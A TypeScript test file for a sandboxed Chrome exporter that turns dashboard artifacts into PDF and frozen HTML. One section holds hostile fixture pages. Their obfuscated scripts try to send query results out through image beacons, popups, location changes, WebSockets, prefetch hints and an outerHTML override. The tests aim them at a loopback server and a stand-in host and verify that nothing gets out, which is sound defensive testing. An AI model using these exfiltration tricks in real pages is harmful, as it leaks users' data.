import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { findChrome } from "@kos/browser";
import type { HtmlPage } from "@kos/shared";

import { pdfText } from "../files/pdftext.js";
import { ArtifactChecker } from "./artifactcheck.js";
import { ArtifactExporter } from "./artifactexport.js";

/**
 * Exports printed and drawn by the check's own Chrome, from the dashboard's
 * build: a doc and a deck as PDF (a slide a page), and a page whose reads are
 * frozen into its HTML and answered from it when the file is opened with no
 * KOS behind it. Skipped without Chrome or the build.
 */

const here = dirname(fileURLToPath(import.meta.url));
const BUILT = resolve(here, "../../../ui/dist/page-lib");
const chrome = findChrome(undefined);

const PAGES: Record<string, HtmlPage> = {
  doc: {
    id: "doc",
    kind: "doc",
    title: "Garden water plan",
    html: `<article data-doc><header><p class="kicker">Brief</p><h1>Garden water plan</h1><p class="lede">Four rain tanks cover a third of summer watering.</p></header>${["Why", "What", "Cost", "When"].map((h) => `<h2>${h}</h2>${"<p>The tap at the gate cannot serve 42 plots, so the tanks go by the sheds, where the roofs are largest and the paths are short.</p>".repeat(6)}`).join("")}<table><tr><th>Item</th><th>Cost</th></tr><tr><td>Tanks</td><td>$4,800</td></tr></table></article>`,
  },
  deck: {
    id: "deck",
    kind: "deck",
    title: "Pitch",
    html: `<main data-deck><section class="title"><h1>Westside garden, 2027</h1><p>General meeting</p><aside class="notes">Open with the harvest.</aside></section><section><h2>Harvest rose a third</h2><p class="big">2,860 kg</p></section><section><h2>Four tanks</h2><p>By the sheds</p></section><section class="closing"><h2>Approve the water plan</h2></section></main>`,
  },
  reading: {
    id: "reading",
    title: "Reading",
    html: `<h1>Reading</h1><p id="out">waiting</p><script>kos.query("SELECT n FROM books").then(function (r) { out.textContent = r.rows.length + " books" }, function (e) { out.textContent = "failed: " + e.message })</script>`,
  },
};

describe.skipIf(!chrome || !existsSync(join(BUILT, "kos-deck.js")))("artifact exports in Chrome", () => {
  let captures: string;
  let checker: ArtifactChecker;
  let exporter: ArtifactExporter;
  const asked: string[] = [];

  beforeAll(() => {
    captures = mkdtempSync(join(tmpdir(), "kos-export-"));
    const load = (id: string): { page: HtmlPage; title: string } | undefined => (PAGES[id] ? { page: PAGES[id]!, title: PAGES[id]!.title } : undefined);
    const call = async (_id: string, _verb: "query" | "file", args: Record<string, unknown>): Promise<unknown> => {
      asked.push(String(args.sql));
      return { rows: [{ n: 1 }, { n: 2 }, { n: 3 }], truncated: false };
    };
    checker = new ArtifactChecker({ load, call, captures: (id) => join(captures, id), pageLib: () => BUILT });
    exporter = new ArtifactExporter({ load, call, browser: (work) => checker.withBrowser(work), pageLib: () => BUILT });
  });

  afterAll(() => {
    checker?.close();
    rmSync(captures, { recursive: true, force: true });
  });

  describe("on a slow machine", () => {
    // A page as the server test's: it reads once its script runs, and shows what it read.
    const READER: HtmlPage = { id: "slow reader", title: "Slow reader", html: '<h1>Reader</h1><p id="out">-</p><script>kos.query("SELECT title FROM shelf").then(function(r){out.textContent=r.rows[0].title})</script>' };
    const LATE: HtmlPage = { id: "late reader", title: "Late reader", html: '<h1>Reader</h1><p id="out">-</p><script>addEventListener("load",function(){setTimeout(function(){kos.query("SELECT title FROM late").then(function(r){out.textContent=r.rows[0].title})},300)})</script>' };
    const slow = (options: { call?: (id: string, verb: "query" | "file", args: Record<string, unknown>) => Promise<unknown>; drawMs?: number } = {}): ArtifactExporter =>
      new ArtifactExporter({
        load: (id) => ({ "slow reader": READER, "late reader": LATE })[id] ? { page: ({ "slow reader": READER, "late reader": LATE } as Record<string, HtmlPage>)[id]!, title: id } : undefined,
        call: options.call ?? (async () => ({ rows: [{ title: "Dune" }], truncated: false })),
        browser: (work) => checker.withBrowser(work),
        pageLib: () => BUILT,
        cpuThrottle: 40,
        ...(options.drawMs ? { drawMs: options.drawMs } : {}),
      });

    it("waits for the frame to start and its reads to settle before it freezes them, its CPU forty times slower", async () => {
      for (const id of ["slow reader", "late reader"]) {
        const html = (await slow().export(id, "html")).body.toString("utf8");
        expect(html, id).toContain("&quot;rows&quot;:[{&quot;title&quot;:&quot;Dune&quot;}]");
      }
    }, 90_000);

    it("refuses in words, rather than freeze half its data, when a read is still waiting at the ceiling", async () => {
      const never = slow({ call: () => new Promise(() => undefined), drawMs: 4000 });
      await expect(never.export("slow reader", "html")).rejects.toThrow(/still waiting on 1 of its reads/);
    }, 60_000);
  });

  it("prints a doc on Letter pages, its text and its table in it", async () => {
    const file = await exporter.export("doc", "pdf");
    expect(file.body.subarray(0, 5).toString()).toBe("%PDF-");
    expect(file.name).toBe("Garden water plan.pdf");
    const read = await pdfText(new Uint8Array(file.body));
    expect(read.pages).toBeGreaterThanOrEqual(1);
    // In reading order: the lede after the title, before the first section.
    expect(read.text).toMatch(/Garden water plan\s+Four rain tanks cover a third of summer watering\.\s+Why/);
    expect(read.text).toMatch(/\$4,800/);
  }, 60_000);

  it("prints a deck a slide a page, with no bar, notes or empty page after the last", async () => {
    const file = await exporter.export("deck", "pdf");
    expect(file.body.subarray(0, 5).toString()).toBe("%PDF-");
    const read = await pdfText(new Uint8Array(file.body));
    expect(read.pages).toBe(4);
    expect(read.text).toMatch(/page 1 of 4 ---\s*Westside garden, 2027/);
    expect(read.text).toMatch(/page 4 of 4 ---\s*Approve the water plan/);
    expect(read.text).not.toMatch(/Open with the harvest|Present/);
  }, 60_000);

  it("freezes a page's reads into its HTML, answered from the file with no KOS behind it", async () => {
    asked.length = 0;
    const file = await exporter.export("reading", "html");
    expect(asked).toEqual(["SELECT n FROM books"]);
    const html = file.body.toString("utf8");
    expect(html).toMatch(/^<!doctype html><html data-theme="light"><head><meta http-equiv="Content-Security-Policy" content="default-src 'none';.*connect-src 'none'.*frame-src about:">/);
    expect(html).toContain('<iframe sandbox="allow-scripts" allow="fullscreen"');
    expect(await openSaved(html, "document.getElementById('out')?.textContent", (v) => !!v && v !== "waiting")).toBe("3 books");
    expect(await openSaved(html, "document.getElementById('out') ? typeof RTCPeerConnection + ' ' + typeof webkitRTCPeerConnection : ''", (v) => !!v)).toBe("undefined undefined");
  }, 60_000);

  describe("an artifact that tries to send what it read somewhere", () => {
    let listener: Server;
    let base: string;
    const hits: string[] = [];
    const sockets: string[] = [];
    const connections: number[] = [];
    beforeAll(async () => {
      listener = createServer((req, res) => {
        hits.push(req.url ?? "");
        res.end("ok");
      });
      // A preconnect is a connection with no request: counted as one.
      listener.on("connection", () => void connections.push(Date.now()));
      // A WebSocket is no request Fetch sees: counted on its own.
      listener.on("upgrade", (req, socket) => {
        sockets.push(req.url ?? "");
        socket.destroy();
      });
      await new Promise<void>((ok) => listener.listen(0, "127.0.0.1", ok));
      base = `http://127.0.0.1:${(listener.address() as AddressInfo).port}`;
      // Every way out the write-time lint does not catch by name: a computed location, top's, a popup, an image, and the binding called straight.
      const leak = (route: string, delay = 50) =>
        `<h1>Leaky</h1><p id="out">waiting</p><script>kos.query("SELECT secret FROM t").then(function(r){var d=encodeURIComponent(JSON.stringify(r)),u="${base}/${route}?d="+d;out.textContent="read";` +
        `try{new Image().src=u+"&img"}catch(e){}try{window["op"+"en"](u+"&open")}catch(e){}try{top["loc"+"ation"]["hr"+"ef"]=u+"&top"}catch(e){}` +
        `try{if(typeof kosRelay==="function")kosRelay(JSON.stringify({id:99,method:"query",args:{sql:"SELECT 'by the binding'"}}))}catch(e){}` +
        `setTimeout(function(){document["loc"+"ation"]["hr"+"ef"]=u+"&self"},${delay})})</script>`;
      PAGES.leaky = { id: "leaky", title: "Leaky", html: leak("export") };
      // Slow to leave, so the test sees it ran in the file before it tries.
      PAGES["leaky file"] = { id: "leaky file", title: "Leaky file", html: leak("file", 1500) };
      PAGES["leaky doc"] = { id: "leaky doc", kind: "doc", title: "Leaky doc", html: `<article data-doc><h1>Leaky doc</h1><p>Text.</p></article>${leak("doc").replace("<h1>Leaky</h1>", "")}` };
    });
    afterAll(() => listener?.close());

    it("opens no connection and resolves no name when it sends itself to a host or a loopback port, in a check or an export", async () => {
      connections.length = 0;
      hits.length = 0;
      const port = base.split(":").pop()!;
      const go = (url: string) => `<h1>Away</h1><script>setTimeout(function(){var d=document;d["loc"+"ation"]["hr"+"ef"]=${JSON.stringify(url)}},30)</script>`;
      PAGES["away host"] = { id: "away host", title: "Away host", html: go(`http://leak-${port}.example.test:${port}/host`) };
      PAGES["away loopback"] = { id: "away loopback", title: "Away loopback", html: go(`${base}/loopback`) };
      for (const id of ["away host", "away loopback"]) {
        await checker.check(id).catch(() => undefined);
        await exporter.export(id, "html");
        await exporter.export(id, "pdf").catch(() => undefined);
      }
      await new Promise((r) => setTimeout(r, 800));
      expect(connections).toEqual([]);
      expect(hits).toEqual([]);
    }, 120_000);

    it("opens no connection for a preconnect, a DNS prefetch, a prerender or a refresh it was stored with", async () => {
      connections.length = 0;
      hits.length = 0;
      const host = base.replace("http://", "");
      PAGES.hints = {
        id: "hints",
        title: "Hints",
        html: `<head><link rel="preconnect" href="${base}"><link rel="dns-prefetch" href="//${host}"><link rel="prerender" href="${base}/pre"><meta http-equiv="refresh" content="0;url=${base}/refresh"><base href="${base}/"></head><body><h1>Hints</h1><p>Plain.</p></body>`,
      };
      await exporter.export("hints", "html");
      await exporter.export("hints", "pdf");
      await new Promise((r) => setTimeout(r, 800));
      expect(connections).toEqual([]);
      expect(hits).toEqual([]);
    }, 60_000);

    it("prints what its own code hands back as the snapshot without running any of it", async () => {
      sockets.length = 0;
      connections.length = 0;
      hits.length = 0;
      const ws = base.replace("http:", "ws:");
      // The snapshot is read in the artifact's frame after its code, so the code can say what it is: here a page that runs and calls out.
      const evil = `<html><head><meta http-equiv="refresh" content="0;url=${base}/refresh"><link rel="preconnect" href="${base}/pre"></head><body><h1>Evil print</h1>` +
        `<iframe sandbox="allow-scripts" srcdoc="<script>new WebSocket('${ws}/frame')</script>"></iframe>` +
        `<svg><script>new WebSocket("${ws}/svg")</script><foreignObject><iframe srcdoc="<script>new WebSocket('${ws}/foreign')</script>"></iframe></foreignObject></svg>` +
        `<img src="${base}/img"><p style="background:url(${base}/css)">x</p></body></html>`;
      PAGES.override = {
        id: "override",
        title: "Override",
        html: `<h1>Override</h1><script>var evil=${JSON.stringify(evil).replace(/</g, "\\u003c")};Object.defineProperty(Element.prototype,"outerHTML",{get:function(){return evil},configurable:true});</script>`,
      };
      const file = await exporter.export("override", "pdf");
      expect((await pdfText(new Uint8Array(file.body))).text).toMatch(/Evil print/);
      await new Promise((r) => setTimeout(r, 1500));
      expect(hits).toEqual([]);
      expect(sockets).toEqual([]);
      expect(connections).toEqual([]);
    }, 60_000);

    it("reaches nothing while KOS draws it for an HTML export or prints it", async () => {
      asked.length = 0;
      await exporter.export("leaky", "html");
      // What tried to leave its frame has nothing left in it to print, and is refused as such.
      await expect(exporter.export("leaky", "pdf")).rejects.toThrow(/tried to leave its frame/);
      await expect(exporter.export("leaky doc", "pdf")).rejects.toThrow(/tried to leave its frame/);
      await new Promise((r) => setTimeout(r, 500));
      expect(hits).toEqual([]);
      // It did read, and did try: what it read had nowhere to go.
      expect(asked).toContain("SELECT secret FROM t");
      expect(asked.filter((sql) => /by the binding/.test(sql))).toEqual([]);
      // No window it opened is left behind.
      const targets = await checker.withBrowser(async ({ cdp }) => ((await cdp.send("Target.getTargets", {})) as { targetInfos: { type: string; url: string }[] }).targetInfos);
      expect(targets.filter((t) => t.type === "page" && t.url.startsWith(base))).toEqual([]);
    }, 90_000);

    it("reaches nothing when its saved file is opened from disk", async () => {
      const file = await exporter.export("leaky file", "html");
      hits.length = 0;
      expect(await openSaved(file.body.toString("utf8"), "document.getElementById('out')?.textContent", (v) => v === "read")).toBe("read");
      await new Promise((r) => setTimeout(r, 2000));
      expect(hits).toEqual([]);
    }, 60_000);
  });

  it("refuses in words, and does not hang, when the Chrome dies under a print", async () => {
    const dying = new ArtifactExporter({
      load: (id) => (PAGES[id] ? { page: PAGES[id]!, title: PAGES[id]!.title } : undefined),
      call: async () => ({ rows: [] }),
      browser: (work) =>
        checker.withBrowser((b) => {
          setTimeout(() => b.reset(), 400);
          return work(b);
        }),
      pageLib: () => BUILT,
    });
    const started = Date.now();
    await expect(dying.export("doc", "pdf")).rejects.toThrow(/Chrome stopped while it drew the artifact/);
    expect(Date.now() - started).toBeLessThan(15_000);
    expect((await exporter.export("deck", "pdf")).body.subarray(0, 5).toString()).toBe("%PDF-");
  }, 60_000);

  it("gives up an export that never settles, closing what it ran, and the Chrome serves the next job", async () => {
    PAGES.spin = { id: "spin", title: "Spin", html: `<h1>Spin</h1><script>setTimeout(function(){for(;;){}},50)</script>` };
    const quick = new ArtifactExporter({ load: (id) => (PAGES[id] ? { page: PAGES[id]!, title: PAGES[id]!.title } : undefined), call: async () => ({ rows: [] }), browser: (work) => checker.withBrowser(work), pageLib: () => BUILT, timeoutMs: 4000 });
    const started = Date.now();
    await expect(quick.export("spin", "pdf")).rejects.toThrow(/took too long|too busy|never started/);
    expect(Date.now() - started).toBeLessThan(10_000);
    const next = Date.now();
    const file = await exporter.export("deck", "pdf");
    expect(file.body.subarray(0, 5).toString()).toBe("%PDF-");
    expect(Date.now() - next).toBeLessThan(10_000);
  }, 90_000);

  /** A saved file opened as a file is, in a tab of its own: what an expression reads in its frame, once it passes. */
  async function openSaved(html: string, expression: string, done: (v: string | undefined) => boolean): Promise<string | undefined> {
    const path = join(captures, `saved-${Date.now()}.html`);
    writeFileSync(path, html);
    return checker.withBrowser(async ({ cdp }) => {
      const { targetId } = (await cdp.send("Target.createTarget", { url: "about:blank" })) as { targetId: string };
      const { sessionId } = (await cdp.send("Target.attachToTarget", { targetId, flatten: true })) as { sessionId: string };
      // The sandboxed frame may be drawn in a process of its own, reached through a session Chrome attaches.
      const sessions = new Set([sessionId]);
      const contexts: { sessionId: string; id: number }[] = [];
      const off = cdp.on((e) => {
        if (!e.sessionId || !sessions.has(e.sessionId)) return;
        if (e.method === "Runtime.executionContextCreated") contexts.push({ sessionId: e.sessionId, id: (e.params as { context: { id: number } }).context.id });
        if (e.method === "Target.attachedToTarget") {
          const child = (e.params as { sessionId: string }).sessionId;
          sessions.add(child);
          void cdp.send("Runtime.enable", {}, child).then(() => cdp.send("Runtime.runIfWaitingForDebugger", {}, child)).catch(() => undefined);
        }
      });
      try {
        await cdp.send("Runtime.enable", {}, sessionId);
        await cdp.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: true }, sessionId);
        await cdp.send("Page.navigate", { url: pathToFileURL(path).href }, sessionId);
        let value: string | undefined;
        for (let i = 0; i < 50 && !done(value); i++) {
          await new Promise((r) => setTimeout(r, 100));
          for (const c of contexts) {
            const got = (await cdp.send("Runtime.evaluate", { expression, contextId: c.id, returnByValue: true }, c.sessionId).catch(() => undefined)) as { result?: { value?: string } } | undefined;
            if (got?.result?.value) value = got.result.value;
          }
        }
        return value;
      } finally {
        off();
        await cdp.send("Target.closeTarget", { targetId }).catch(() => undefined);
      }
    });
  }
});
